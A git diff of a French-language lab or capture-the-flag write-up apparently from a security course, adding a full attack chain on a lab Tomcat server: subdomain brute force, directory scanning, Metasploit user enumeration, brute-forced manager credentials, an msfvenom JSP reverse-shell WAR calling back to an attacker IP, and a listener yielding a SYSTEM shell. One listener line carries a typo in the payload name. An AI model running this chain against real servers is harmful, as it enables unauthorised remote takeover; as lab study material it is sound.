@@ -2,7 +2,7 @@
 
 **Auteurs : ** Gwendoline Dössegger & Cassandre Wojciechowski
 
-**Date : ** 07.10.2020
+**Date : ** 25.09.2020 au 29.10.2020
 
 -----
 
@@ -14,7 +14,7 @@
 - **10.10.40.122**	*flag : AST16{d3f4u17_cr3d5_3v3rywh3r3}*
 - **10.10.40.128**	*flag : AST16{up104d_w17h_57y13_15_n07_3n0u6h}*
 - **10.10.40.138**	*flag : EHK17{1a86ff7923c40c9ccd806ee5036d363c068ccc4d}*
-- **10.10.40.168**	*flag : not found yet*
+- **10.10.40.168**	*flag : t*
 - **10.10.40.231**	*flag : not found yet*
 
 ## Scanning 
@@ -213,7 +213,7 @@ Pour nous y connecter, nous avons décidé de tester les mots de passe par défa
 
 ````shell
 msfconsole
-use scanner/http/tomcat_mgr_login					#pour tester les id par défaut
+use auxiliary/scanner/http/tomcat_mgr_login					#pour tester les id par défaut
 set RHOST 10.10.40.122								#ip de la victime
 run
 
@@ -398,27 +398,143 @@ vim /etc/hosts
 10.10.40.168 www.corporation-sa.com
 ```
 
+Avec l'outil `fierce` , on trouve un sous-domaine appelé `backend.corporation-sa.com`.
 
+````shell
+fierce -dnsserver 10.10.40.168 -dns corporation-sa.com -wordlist /usr/share/fierce/hosts.txt 
 
-recherche des urls existants avec metasploit
+Trying zone transfer first...
 
-http://theevilbit.blogspot.com/2013/11/metasploitable-walkthrough.html
+Unsuccessful in zone transfer (it was worth a shot)
+Okay, trying the good old fashioned way... brute force
 
+Checking for wildcard DNS...
+Nope. Good.
+Now performing 2280 test(s)...
+10.10.40.168    backend.corporation-sa.com
+10.10.40.168    www.corporation-sa.com
+
+Subnets found (may want to probe here using nmap or unicornscan):
+        10.10.40.0-255 : 2 hostnames found.
+
+Done with Fierce scan: http://ha.ckers.org/fierce/
+Found 2 entries.
+
+Have a nice day.
 ````
-Requested URL:
-http://server/does-not-exist
-HTTP response:
-HTTP/1.1 404 Not Found
-Requested URL:
-http://server/WEB-INF
-HTTP response:
-HTTP/1.1 302 Found
-Location: http://server/WEB-INF/
-Requested URL:
-http://server/WEB-INF/
-HTTP response:
-HTTP/1.1 404 Not Found https://hackdefense.com/publications/cve-2015-5345-apache-tomcat-vulnerability/
+
+On a donc modifié le fichier `/etc/hosts` de la manière suivante :
+
+````shell
+vim /etc/hosts
+
+#Modifier 
+10.10.40.168 	backend.corporation-sa.com
 ````
+
+Une fois le fichier modifié, on a accédé via un navigateur à la page web.  À l'aide de `dirb`, on a découvert le répertoire `/manager` qui demande une authentification. 
+
+``````shell
+#Commande
+dirb http://backend.corporation-sa.com
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+START_TIME: Thu Oct 29 16:50:53 2020
+URL_BASE: http://backend.corporation-sa.com/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+-----------------
+GENERATED WORDS: 4612                                                          
+---- Scanning URL: http://backend.corporation-sa.com/ ----
++ http://backend.corporation-sa.com/manager (CODE:302|SIZE:0)               
+-----------------
+END_TIME: Thu Oct 29 16:52:35 2020
+DOWNLOADED: 4612 - FOUND: 1
+``````
+
+Pour connaître les identifiants nécessaires, nous avons utilisé le module `metasploit` suivant ainsi que cette configuration :
+
+````shell
+use auxiliary/scanner/http/tomcat_enum
+set rhost 10.10.40.168
+set rport 80
+set targeturi /manager
+run
+
+#Sortie 
+[*] http://10.10.40.168/manager - Checking j_security_check...
+[*] http://10.10.40.168/manager - Server returned: 302
+[*] http://10.10.40.168/manager - Apache Tomcat - Trying name: 'admin'
+[+] http://10.10.40.168/manager - Apache Tomcat admin found 
+[*] http://10.10.40.168/manager - Apache Tomcat - Trying name: 'manager'
+[+] http://10.10.40.168/manager - Apache Tomcat manager found 
+[*] http://10.10.40.168/manager - Apache Tomcat - Trying name: 'role1'
+[+] http://10.10.40.168/manager - Apache Tomcat role1 found 
+[*] http://10.10.40.168/manager - Apache Tomcat - Trying name: 'root'
+[+] http://10.10.40.168/manager - Apache Tomcat root found 
+[*] http://10.10.40.168/manager - Apache Tomcat - Trying name: 'tomcat'
+[+] http://10.10.40.168/manager - Apache Tomcat tomcat found 
+[*] http://10.10.40.168/manager - Apache Tomcat - Trying name: 'both'
+[+] http://10.10.40.168/manager - Apache Tomcat both found 
+[+] http://10.10.40.168/manager - Users found: admin, both, manager, role1, root, tomcat
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+````
+
+On a brute force et on a finalement trouvé les identifiants `User: manager` et `Password: admin`.
+
+Une fois connecté, on va générer un fichier `.war` avec `msfvenom`. Et on l'a déployé sur le serveur. On a donc créé une backdoor à l'adresse `http://backend.corporation-sa.com/onAtOutCasse`
+
+````shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.42.12 LPORT=5555 -f war > onAtOutCasse.war
+````
+
+Ensuite, on a créé le `listener` à l'aide de `metasploit` comme suit :
+
+````shell
+use exploit/multi/handler
+set payload java/jsp_sheéé_reverse_tcp
+set LHOST 10.10.42.12
+set LPORT 5555
+exploit
+
+#Attention à ne pas oublier d'aller sur l'URL adéquate
+[*] Started reverse TCP handler on 10.10.42.12:5555 
+[*] Command shell session 2 opened (10.10.42.12:5555 -> 10.10.40.168:49178) at 2020-10-29 17:30:44 +0000
+````
+
+Avec la commande `whoami`, on peut voir qu'on est `autorite nt\system`. En se promenant sur le serveur et plus précisément dans le répertoire `C:\Users\Administrateur\Desktop>` on trouve le fichier `flag.txt`. 
+
+``````shell
+#Affichage du contenu de flag.txt
+C:\Users\Administrateur\Desktop>type flag.txt
+--------------------------------File---------------------------------
+type flag.txt
+The flag is AST16{administrator password here}
+
+Not so easy boy ! You have to dump the administrator password
+in order to have the flag !!!
+
+Enjoy
+``````
+
+
+
+
+
+
+
+Flag : `AST16{administrator password here}`
+
+
+
+
+
+
+
+
 
 https://nullarmor.github.io/posts/jerry
 
@@ -440,33 +556,6 @@ dirb http://www.corporation-sa.com
 https://medium.com/@arkanoidctf/hackthebox-writeup-jerry-aa2b992917a7
 
 
-
-
-
-``````shell
-root@kali:/media/sf_AST/AST_lab1# nikto -h 10.10.40.168 -p 80
-- Nikto v2.1.6
----------------------------------------------------------------------------
-+ Target IP:          10.10.40.168
-+ Target Hostname:    10.10.40.168
-+ Target Port:        80
-+ Start Time:         2020-10-19 21:31:56 (GMT1)
----------------------------------------------------------------------------
-+ Server: Apache-Coyote/1.1
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
-+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
-+ Root page / redirects to: http://www.corporation-sa.com/
-+ No CGI Directories found (use '-C all' to force check all possible dirs)
-+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
-+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
-+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
-+ 7889 requests: 0 error(s) and 6 item(s) reported on remote host
-+ End Time:           2020-10-19 21:34:56 (GMT1) (180 seconds)
----------------------------------------------------------------------------
-+ 1 host(s) tested
-
-``````
 
 
 
